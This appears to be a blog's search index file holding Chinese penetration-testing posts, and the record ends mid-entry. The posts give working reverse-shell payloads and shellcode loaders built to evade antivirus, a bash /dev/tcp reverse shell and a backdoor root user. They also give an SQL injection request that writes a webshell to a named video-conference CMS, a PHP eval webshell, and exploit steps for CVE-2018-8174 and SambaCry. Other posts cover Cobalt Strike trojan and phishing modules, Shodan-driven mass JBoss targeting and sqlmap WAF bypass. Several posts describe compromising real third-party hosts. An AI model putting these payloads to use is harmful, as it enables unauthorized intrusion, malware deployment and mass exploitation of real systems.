<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[frp内网穿透]]></title>
    <url>%2F2018%2F09%2Ffrp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%2F</url>
    <content type="text"><![CDATA[frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。主要他是一个开源的。下载地址:https://github.com/fatedier/frp/releases 我是下载linux_amd64msf配合frp使用内网穿透。kali和肉鸡都是在不同网段的内网，如何让他们通信呢？使用frp就简单了。 基本配置123公网vps：45.32.*.*内网kali：192.168.3.16内网win7：192.168.230.128 frp无需安装，配置运行即可，只需要frps、frps.ini。 vps配置1234567bind_addr = 0.0.0.0 //填0.0.0.0即可意为本机ipbind_port = 6531 //frp连接端口dashboard_addr = 0.0.0.0 //填0.0.0.0即可意为本机ipdashboard_port = 7500 //网页访问端口dashboard_user = admin //用户名dashboard_pwd = hamal //密码token = hamal //frp连接口令 配置好后即可运行服务器端：./frps -c ./frps.ini通过浏览器查看 frp 的状态以及代理统计信息展示。http://45.32.*.*:7500 输入用户名和密码 kali配置123456789[common]server_addr = 45.32.*.* //vps的ipserver_port = 6531 //连接frp的端口token = hamal //连接frp口令[msf]type = tcp //tcp协议local_ip = 127.0.0.1 //填127.0.0.1即可local_port = 6759 //转发到vps的点端口remote_port = 6000 //访问端口 运行客户端：./frpc -c ./frpc.ini msf生成木马12msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=45.32.*.* LPORT=6000 -e x86/shikata_ga_nai -i 15 -b &apos;\x00\&apos; PrependMigrate=true PrependMigrateProc=svchost.exe -f c &gt; shellcode.c 这里的paylload选择windows/meterpreter/reverse_tcp，LHOST填vps的ip，LPORT填6000。-e x86/shikata_ga_nai -i 15是编码15次，而PrependMigrate=true、PrependMigrateProc=svchost.exe使这个程序会迁移到svchost.exe进程，还可以使用windows/meterpreter/reverse_tcp_rc4这个payload，对会话进行加密，增加免杀能力。会生成一个shellcode.c文件，接着编译木马。我使用vc++6.0编译。新建一个c++的win32项目将以下代码模板复制进去，在把你得到的shellcode那长串数字复制到shellcode的位置，生成exe文件。1234567891011#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //去除窗口unsigned char shellcode[]=（这里放生成的shellcode）void main()&#123; LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)();&#125; msf配置监听端12345use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 127.0.0.1 //填127.0.0.1即可set LPORT 6759 //是填转发的端口exploit 监听成功，放木马到内网的肉鸡运行。运行成功，收到反弹shell。 总结使用frp可以解决两天不同网段的内网连接，特别是使用msf的时候。msf是比较简单的免杀方式，依靠msf生成的shellcode免杀，还不错。]]></content>
      <categories>
        <category>网络代理</category>
      </categories>
      <tags>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux渗透]]></title>
    <url>%2F2018%2F09%2Flinux%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[用Struts2拿下的，看到是公网ip，心动了。。。查看自己是什么权限root权限,上传一句话高高兴兴去连接，结果错误。。。好吧！上传大马。访问成功，但上传文件失败。。。root权限，外网，拿不下不甘心啊，换方法。 方法一创建用户，ssh连接。创建一个用户1useradd shell //创建一个shell用户 因为不能交互 所以无法使用passwd命令尝试不是交互模式设置密码。1echo &quot;shell123.0&quot; | passwd -stdin shell 加入root组。1usermod -g root shell 确定添加shell用户成功。1id shell ssh连接结果拒绝我的密码，难受。。。看来在这里使用不是交互模式设置密码失败。 方法二用bash反弹shell。公网开启nc监听。命令：1nc -lvvp 8060 linux反弹shell。命令：1bash -i &gt;&amp; /dev/tcp/x.x.x.x/8060 0&gt;&amp;1 执行成功。但是windows服务器上并没有收到任何反弹信息换端口换反弹方式都失败应该是防火墙的问题，又失败了，好难受。 方法三这次用msf神器。用msf生成一个linux后门，命令：1msfvenom.bat -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=*.*.*.* LPORT=8090 -e x86/shikata_ga_nai -i 3 -felf &gt; c:\test 详解：12345678-a x86 32位--platform linux 后门程序运行的平台-p linux/x86/meterpreter/reverse_tcp 使用的payload模块LHOST=*.*.*.* 反弹到攻击主机的IP地址LPORT=8090 反弹到攻击主机的端口号-e x86/shikata_ga_nai 使用的编码方式-i 3 重复封装编码3次-felf &gt; c:\test 输出后门文件到c盘目录下，文件名test 生成好了,把后面放在另一台肉鸡上。用wget下载。1wget http://*.*.*.*/test 执行成功。看一下是否存在后门。确定后门存在。在msf上开始监听。12345use exploit/multi/handlerset PAYLOAD linux/x86/meterpreter/reverse_tcpset LHOST *.*.*.*set LPORT 8090exploit 监听成功，记得更改后门权限。命令：1chmod 777 test 执行后门。命令：1./test 得到shell，是root权限，就用passwd改掉咱们原来添加的test的密码。ssh连接成功，这就开心了。 总结在遇到st2漏洞但是有防火墙，不能上马，不能反弹shell，只能执行非交互命令的时候可以用msf生成一个后门然后进行进一步提权。本次测试仅仅做为学习，漏洞已经提交给管理员，请勿用于非法用途，所产生的一切后果与作者无关。参考文章]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3层vps连接配置]]></title>
    <url>%2F2018%2F08%2F3%E5%B1%82vps%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[基本信息简单说一下，用一台电脑做网关，电脑的流量只能从网关出去，另外模拟3台vps。1234网关：192.168.0.10vps1:192.168.3.131vps2:192.168.4.131vps3:192.168.5.131 网关（debian系统）安装shadowsocks客户端配置/etc/shadowsocks/config.json文件1234567891011&#123; &quot;server&quot;:&quot;192.168.3.131&quot;, //vps1的ip &quot;server_port&quot;:6666, //vps1的端口 &quot;local_address&quot;: &quot;0.0.0.0&quot;, //允许局域网内的ip连接 &quot;local_port&quot;:1080, //端口 &quot;password&quot;:&quot;123456&quot;, //连接shadowsocks的密码 &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, //加密 &quot;fast_open&quot;: false, &quot;workers&quot;: 1&#125; 启动shadowsocks1sslocal -c /etc/shadowsocks/config.json vps1将6666端口转发给vps2的7777端口。12iptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 192.168.4.131:7777iptables -t nat -A POSTROUTING -p tcp -d 192.168.4.131 --dport 7777 -j SNAT --to-source 192.168.3.131 vps2将7777端口转发给vps3的8888端口。12iptables -t nat -A PREROUTING -p tcp --dport 7777 -j DNAT --to-destination 192.168.5.131:8888iptables -t nat -A POSTROUTING -p tcp -d 192.168.5.131 --dport 8888 -j SNAT --to-source 192.168.4.131 vps3安装shadowsocks服务端配置/etc/shadowsocks.json12345678&#123;&quot;server&quot;:&quot;192.168.5.131&quot;, //vps3的ip&quot;server_port&quot;:8888, //端口&quot;local_port&quot;:1080,&quot;password&quot;:&quot;123456&quot;, //密码&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;&#125; 启动shadowsocks1ssserver -c /etc/shadowsocks.json 基本配置完成。 测试连接使用Proxifier代理测试，填网关地址和端口。测试成功。总结主要是网关连接vps1，然后转发给vps2，在转发给vps3，vps3接收转发的流量，这样3层vps连接就完成了。]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[V2视频会议系统存在SQL注射、XXE漏洞(可getshell)]]></title>
    <url>%2F2018%2F07%2FV2%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%B0%84%E3%80%81XXE%E6%BC%8F%E6%B4%9E-%E5%8F%AFgetshell%2F</url>
    <content type="text"><![CDATA[这个是cms网站，可实现批量getshell。 sql注入存在sql注入。 XXE漏洞webservice服务存在blind xxe,访问http://**.**.**.**/Conf/services/ConferenceWebService?wsdl有个名为xml的参数，可以提交xxe payload测试(payload需要实体编码) getshell会议系统为集成安装环境，windows服务器， apache+mysql4+tomcat，利用sql注入就能写shell了。构造Payload123456789101112POST /Conf/jsp/systembulletin/bulletinAction.do?operator=details HTTP/1.1Host: **.**.**.**Proxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8 Content-Length: 995Content-Type: application/x-www-form-urlencodedsysId=-1%20union%20select%200xapos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos; into dumpfile &apos;../../management/webapps/root/cmd.jsp&apos;%23 成功创建cmd.jsp文件。访问http://**.**.**.**/cmd.jsp?cmd=whoami执行cmd命令成功。修改上传内容，上传大马。 总结这个cms漏洞可以实现批量getshell，而且是高权限，缺点是只要在Windows环境下搭建。修复方案：参数过滤修复xxe参考文章]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[双杀0day漏洞（CVE-2018-8174）复现]]></title>
    <url>%2F2018%2F07%2F%E5%8F%8C%E6%9D%800day%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8174%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞描述全球首例利用浏览器0day漏洞的新型Office文档攻击，我们将该漏洞命名为“双杀”漏洞。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。 漏洞复现12攻击机kali ip：192.168.31.85靶机Windows7 ip：192.168.31.137 下载exp1git clone https://github.com/Sch01ar/CVE-2018-8174_EXP 生成带有恶意 VBscript 的 html 页面和 word 文档12345-u：URL地址-o：生成文档-i：监听地址-p：监听端口python CVE-2018-8174.py -u http://192.168.31.85/exploit.html -o msf.rtf -i 192.168.31.85 -p 4444 把 explot.html 复制到 /var/www/html，并开启 apache 服务12cp exploit.html /var/www/htmlservice apache2 start nc监听4444端口在靶机的 IE 浏览器打开恶意 URL，或者打开 word 打开 msf.rtf收到反弹shell 总结这个漏洞复现简单，可玩性比较高，因为是双杀的。参考文章]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil使用Python生成EXE（免杀最大化）]]></title>
    <url>%2F2018%2F07%2FVeil%E4%BD%BF%E7%94%A8Python%E7%94%9F%E6%88%90EXE%EF%BC%88%E5%85%8D%E6%9D%80%E6%9C%80%E5%A4%A7%E5%8C%96%EF%BC%89%2F</url>
    <content type="text"><![CDATA[先来一张效果图。 生成Python文件运行Veil1234./Veil.pyuse 1list //查看payloadsuse 28 //选择payloads 1234set LHOST 192.168.*.* //设置IP地址set LPORT 11550 //设置端口options //看payloads的设置generate //生成payloads 选择第2，使用Py2Exe生成看到生成的文件有30.py runme.bat setup.py 生成exe文件先在win7虚拟机中安装了Python2.7、 py2Exe、 PyCrypto、 PyWin32，都是32位的。然后将python脚本变为可执行文件。复制到win7，运行runme.bat，生成exe文件。 VirustotalVirustotal在线检测，66个引擎只有9个发现后门。 运行msfconsole12345use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.*.* set LPORT 11550run 运行30.exe接收到反弹的shell 总结整体来说这次免杀还是不错的，平时在内网渗透可以用这个免杀技术过大部分杀毒软件，但杀毒软件的更新是非常快的，免杀技术需要不断地磨练与实践，才能在实战中提高成功率。]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>远控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil过免杀]]></title>
    <url>%2F2018%2F07%2FVeil%E8%BF%87%E5%85%8D%E6%9D%80%2F</url>
    <content type="text"><![CDATA[最近一直研究Jboss反序列化漏洞做内网渗透，可以用veil过很多杀软。安装veil是个大坑，安装了好久才成功。。。配合msfconsole使用。 生成木马启动veil1use 1 1use 5 设置IP地址和端口123set LHOST 124.226.*.*set LPORT 11550generate 输入生成木马的名称 启动msfconsole12345use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset LHOST 192.168.*.* --我这是内网的，做了端口转发，所以IP地址不一样set LPORT 11550run 在肉鸡运行17.exe反弹shell成功。]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>远控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux版永恒之蓝]]></title>
    <url>%2F2018%2F05%2FLinux%E7%89%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%2F</url>
    <content type="text"><![CDATA[漏洞概述2017年5月24号，Samba官方发布4.6.4版本，声明修复了一个严重漏洞（CVE-2017-7494），可以造成远程代码执行，运行Samba服务的Linux/Unix设备，可能会被直接getshell。 Samba是在Linux或Unix系统上用来实现文件共享和打印服务的通信协议，也是很多家用的智能硬件设备例如NAS设备内置的协议，采用服务端口445。由于Samba内置函数is_known_pipename里面出现字符过滤问题，导致攻击者可以向共享目录传递恶意文件，导致被远程代码执行。 影响版本Samba 3.5.0 ~ 4.5.10中间的所有版本。 漏洞复现环境Kali Linux 2018 –&gt; Kali Linux 2017渗透机：Kali Linux 2018（ip：192.168.31.85）靶机：Kali Linux 2017（ip：192.168.31.184） Kali Linux 2017，查看Samba版本1samba --version Version 4.5.8-Debian Kali Linux 2017里面创建Samba共享目录12mkdir /tmp/public //创建共享目录chmod 777 /tmp/public //修改读写执行权限 这是SambaCry漏洞利用的前提，必须有一个共享目录，这样攻击者就可以在这个共享目录传递攻击代码并执行，获取到Root权限并控制肉鸡。 Kali Linux 2017 修改Samba配置文件123456789vim /etc/samba/smb.conf[public] comment = public browseable = yes writeable = yes path = /tmp/public public = yes read only = no Kali Linux 2017 重启/启动Samba服务12/etc/init.d/samba restart //重启samba服务netstat -tnlp samba //查看samba端口状态 开始攻击Kali Linux 2018 进入msf框架，使用SambaCry渗透模块123msfconsole //进入msfuse exploit/linux/samba/is_known_pipename //使用渗透模块is_known_pipenameinfo //查看模块信息 1show options //查看模块选项 12set RHOST 192.168.31.184 //设置靶机地址exploit //开始攻击 成功拿到shell。参考文章]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前台拿Webshell]]></title>
    <url>%2F2018%2F04%2F%E5%89%8D%E5%8F%B0%E6%8B%BFWebshell%2F</url>
    <content type="text"><![CDATA[抓包工具里的圣杯charles软件安装简单。下载地址：https://www.haiyangtop.cn/charles.rar 。根据你是X86还是X64机器来安装不同的charles版本，里边还有个破解文件charles.jar，要放在charles安装目录底下的lib目录。你再是找到压缩文件里边的ssl证书，双击安装，注意安装时要安装到受信任的根证书目录。 开始前台拿webshell我在一个网站的前台找到了一个上传点。我们先来上传一张正常的图片，然后在浏览器上右键点击图片检查，找到了上传路径。我们打开charles抓包来分析一下吧。你打开charles之后并不需要你改动其它什么，直接就能抓包了。现在上传一张正常图片的抓包。开始上传一句话，一句话内容：1&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt; 上传成功，我们改下文件名。点击上面有支笔的图标修改上传内容，改文件名为55.php，并点击下面的Execute再次提交。构造下一句话地址，访问成功。 菜刀连接一句话成功连接一句话。我写这篇文章时，大家以为很简单就传上去了，其实我花费了足足有3个小时的功夫，经过了不断测试才成功，这次我用burpsuite来拦截上传失败了，不知道啥原因，写这篇文章时又理清了思考细节，所以你觉得很流畅。]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jboss反序列化漏洞批量验证]]></title>
    <url>%2F2018%2F04%2FJboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[什么是反序列化漏洞？2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。 Shodan批量下载ip在上篇文章 Shodan批量自动化 讲到如何批量下载ip，是为现在打下基础。执行下面代码下载第一页ip1python Shodan_So.py -search &quot;JBossWeb-2.1 port:8080&quot; --list_ip &gt;&gt; ips1.txt --list_ip_port 执行下面代码下载第2页ip1python Shodan_So.py -search &quot;JBossWeb-2.1 port:8080&quot; --list_ip &gt;&gt; ips10.txt --list_ip_port --page 2 以此类推，一共有搜索到1237个ip。 批量验证Jboss反序列化漏洞脚本代码1234567891011121314151617181920212223242526272829303132# coding=utf-8import requestsimport reimport sysdef get_status(url): try: r = requests.get(url, allow_redirects=False) status_code = r.status_code except requests.exceptions.ConnectionError as e: if (e): status_code = 404 return status_codedef get_target_ip(file_name): with open(file_name) as fo: contents = fo.read() return re.findall(r&quot;\b(?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b:8080&quot;, contents)def request_main(result): for line in result: print line if line: status = get_status(&apos;http://&apos; + line + &apos;/&apos; + &apos;/invoker/readonly&apos;) if status == 500: print &quot;Success&quot; #success_file = open(&quot;success.txt&quot;) with open(&quot;success.txt&quot;,&quot;a&quot;) as fo: fo.write(line+&quot;\n&quot;) else: print &quot;Failed&quot;if __name__ == &quot;__main__&quot;: file_name = sys.argv[1] result = get_target_ip(file_name) request_main(result) 将代码保存为12.py，代码简单验证http://URL/invoker/readonly 网页状态码是500，就可能存在漏洞，省下很多时间。。。使用方法1python 12.py ip1.txt 网页状态码是500的写入success.txt文本。 Jboss反序列化工具直接获取的shell。如果遇到是乱码还可以使用另一个工具反弹shell。nc监听端口反弹shell收到反弹的shell]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shodan批量自动化]]></title>
    <url>%2F2018%2F04%2FShodan%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96%2F</url>
    <content type="text"><![CDATA[什么是ShodanShodan是互联网上最可怕的搜索引擎。Shodan所搜集到的信息是极其惊人的。凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。 Shodan的基本语法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647hostname：&quot;主机或域名&quot;如 hostname:&quot;google&apos;&apos;port：&quot;端口或服务&quot;如 port:&quot;21&quot;ip : &quot;ip地址&quot;如 ip : &quot;168.200.71.60&quot;net：&quot;IP地址或子网&quot;如 net:&quot;210.45.24.0/24&quot;vuln :指定漏洞的cve如 vuln:CVE-2015-8869但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160os :&quot;操作系统&quot;​如 os:&quot;centOS&quot;isp：&quot;ISP供应商&quot;如 isp:&quot;China Telecom&quot;product：&quot;操作系统/软件/平台&quot;如 product:&quot;Apache httpd&quot;version：&quot;软件版本&quot;如 version:&quot;3.1.6&quot;geo：&quot;经纬度&quot;如 geo:&quot;39.8779,116.4550&quot;country：&quot;国家&quot;如 country:&quot;China&quot;country:&quot;UN&quot;city：&quot;城市&quot;如 city:&quot;Hefei&quot;org：&quot;组织或公司&quot;如 org:&quot;google&quot;before/after：&quot;日/月/年&quot;如 before:&quot;25/03/2018&quot;after:&quot;25/03/2018&quot;asn : &quot;自治系统号码&quot;如 asn:&quot;AS2233&quot; 命令行下使用Shodan下载Shodan项目1git clone https://github.com/achillean/shodan-python.git 执行安装12cd shodan-pythonpython setup.py install Key进行初始化在Web网站的个人主页可以看到自己的API Key1shodan init API_Key 用shodan查询1如 shodan count +&quot;Apache&quot; 其他更多语法，在Python脚本中使用Shodan API时，可以通过查看 官方文档 进行学习。 Python脚本批量自动化上面提到了使用Shodan API的开发文档，实战过程中为了方便起见，大可编写适合自己的脚本工具，进行批量化搜索和利用。下面介绍一下该工具的使用方法。连接地址:https://github.com/zev3n/Shodan_So1./Shodan_So.py -h -search命令后面接你要查询的内容，语法和在官网查询是一样的。1./Shodan_So.py -search &quot;apache&quot; 可以看到，本工具的查询效果和网页查询几乎是一样的。这里需要着重介绍的参数还有--list_ip在查询命令后面加上这个参数之后，脚本会自动提取查询结果中的ip地址并打印。我们可以利用输出重定向将查询的ip列表保存到txt文件中，以供后续利用。例如：1./Shodan_So.py -search &quot;apache&quot; --list_ip &gt;&gt; ip.txt 另外，加上--list_ip_port参数后是返回IP地址:端口形式的地址，以供后续不同场景的利用。1./Shodan_So.py -search “apache” --list_ip &gt;&gt; ip.txt --list_ip_port -iprg参数接受的则是CIDR地址块，可实现指定子网范围内主机的查询。-f参数接受的是一个ip地址的文本文档，不同地址用换行隔开，本工具会依次读取文档内的ip地址并依次查询。参考文章]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike 3.8使用]]></title>
    <url>%2F2018%2F04%2FCobalt-Strike-3-8%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[简介 Cobalt Strike集成了端口转发、扫描多模式端口监听Windows exe木马，生成Windows dll(动态链接库)木马，生成java木马，生成office宏病毒，生成木马捆绑钓鱼攻击，包括站点克隆目标信息获取java执行浏览器自动攻击等等。下载地址网上有好多，这里就不附上了。 启动Cobalt Strike 3.8先对teamserver文件进行赋权。 chmod +x teamserver 启动teamserver，命令为：./teamserver 服务器端ip 登录密码，默认端口是50050。 ./teamserver 192.168.x.x 123456 将teamserver启动之后，就可以运行客户端了。 java -jar cobaltstrike.jar Host是IP地址，Port为50050，User随意填，Password是你刚才设置的密码123456，点击Connect。 介绍各个功能模块翻译一下功能模块，更容易尽快掌握使用。123456789New Connection 新建立一个用户连接Preferences 配置自己喜欢的Visualization 可视化 pivot graph 控制主机 视图 session table 一个会话 Target table 目标表Vpn lnterfaces VPN接口listeners 建立个反弹shell的监听器script manager 脚本管理 1234567891011View模块Applications 显示受害者机器的应用信息Credentials 显示受害者机器的凭证信息，能更方便的进行后续渗透Downloads 文件下载Event Log 查看web日志。可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天Keystrokes 查看键盘记录Proxy Pivots 查看代理信息Screenshots 查看屏幕截图Script Console 在这里可以加载各种脚本以增强功能，脚本地址Targets 查看目标Web Log 查看web日志 12345678Packages 主要生成Payload HTML Application 生成恶意的HTA木马文件 MS Office Macro 生成office宏病毒文件 Payload Generator 生成各种语言版本的payload USB/CD AutoPlay 生成利用自动播放运行的木马文件 Windows Dropper 捆绑器，能够对文档类进行捆绑 Windows Executable 生成可执行exe木马 Windows Executable(S) 生成无状态的可执行exe木马 123456789Web Drive-by（钓鱼攻击） manager 对开启的web服务进行管理 Clone Site 克隆网站，可以记录受害者提交的数据 Host File 提供一个文件下载，可以修改Mime信息 PowerShell Web Delivery 类似于msf 的web_delivery Signed Applet Attack 使用java自签名的程序进行钓鱼攻击 Smart Applet Attack 自动检测java版本并进行攻击 System Profiler 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等Spear Phish 是用来邮件钓鱼的模块 12345678Reporting 生成报告Activity report 活动报告生成Hosts report 主机报告Indicators of compromise 目标报告Sessions report 会话报告Social engineering report 社会工程报告Reset data 重置数据Export data 数据出口 功能介绍完毕。 生成Windows木马下面生成一Windows木马。选择Cobalt Strike → listeners ，点击Add新建，Nnme随意填，ip是本机的ip，端口8899，点击Save。选择Attacks → Packages → Windows Executable，点击Generate生成木马。看到连接成功。]]></content>
      <categories>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>远控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见SQLmap使用方法]]></title>
    <url>%2F2018%2F03%2F%E5%B8%B8%E8%A7%81SQLmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[ASP COOKIE注入我在注射点参数上加and 1=1后，http://url/shownews.asp?id=93 and 1=1出现如下图所示的情况。很明显，有防护呀.所以该读者默认参数注射是不能成功的。像这种情况，我们可以用SQLMAP的tamper参数来绕过试一下。不过在此之前，我们还是先试一下http://url/?id=1 有没有COOKIE注射。因为很多老的软防护waf只会对GET、POST进行保护，却忽略了COOKIE。默认情况下SQLMAP只支持GET/POST参数的注入测试.现在使用cookie注入命令：1sqlmap.py -u &quot;http://url/shownews.asp&quot; --cookie &quot;id=93&quot; --level 2 --dbms &quot;Microsoft Access&quot; PHP注入(1)查找数据库 python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; –dbs (2)通过第一步的数据库查找表(假如数据库名为dataname) python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; -D dataname –tables (3)通过2中的表得出列名(假如表为table_name) python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name –columns (4)获取字段的值(假如扫描出id,user,password字段) python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C “user,password” –dump post登陆框注入(1)其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp几种注入方式：1sqlmap.py -r search-test.txt -p tfUPass (2)自动的搜索1sqlmap -u http://testasp.vulnweb.com/Login.asp --forms (3)指定参数搜索1sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=321&amp;tfUPass=321&quot; 绕过WAF防火墙注入点:http://192.168.159.1/news.php?id=11sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot; space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py都是编码方式space2hash.py base64encode.py charencode.py sqlmap详细命令–is-dba 当前用户权限（是否为root权限）–dbs 所有数据库–current-db 网站当前数据库–users 所有数据库用户–current-user 当前数据库用户–random-agent 构造随机user-agent–passwords 数据库密码–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）相关连接地址:https://mrxn.net/Infiltration/sqlmap-teaches-share-all.html]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用sqlmap粗暴地绕过waf]]></title>
    <url>%2F2018%2F03%2F%E7%94%A8sqlmap%E7%B2%97%E6%9A%B4%E5%9C%B0%E7%BB%95%E8%BF%87waf%2F</url>
    <content type="text"><![CDATA[许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……但是有那么多tamper该如何快速找出适合的？一个一个来试是否是太累太费劲，而且对有些小白来讲很难记住每个tamper脚本具体是做什么用的。土司的lostwolf写了一个sh命令，可以在kali下直接依次使用每个tamper脚本，从而找到合适的。该sh语句是：1for t in `ls /usr/share/sqlmap/tamper/*.py`; do echo -e &quot;e[41;1m tamper: $te[0m&quot;; sqlmap -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper $t --threads 10;done; 说明下 –random-agent参数随机；random-agent 随机agent头 ；–smart 智能机的方式；–batch 默认选择接收输入；echo -e “e[41;1m tamper: $te[0m”; 是为了红底白字显示当前使用的tamper脚本。如果在windows下怎么办，我写了一个批处理，命令如下（sqlmap路径位置自行更改）：1for /f &quot;delims=&quot; %%i in (&apos;dir /b D:sqlmap amper*.py&apos;) do d:sqlmapsqlmap.py -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper %%i --threads 10 当然这个方法也是有缺陷的，会非常粗暴地调用每个tamper脚本来试一次，并且不会组合脚本来测试了，所以大家如果能了解每个tamper脚本作用，精准的调用，会省力省时很多。原文地址:https://www.toutiao.com/i6527560237581337091/]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站的渗透测试思路]]></title>
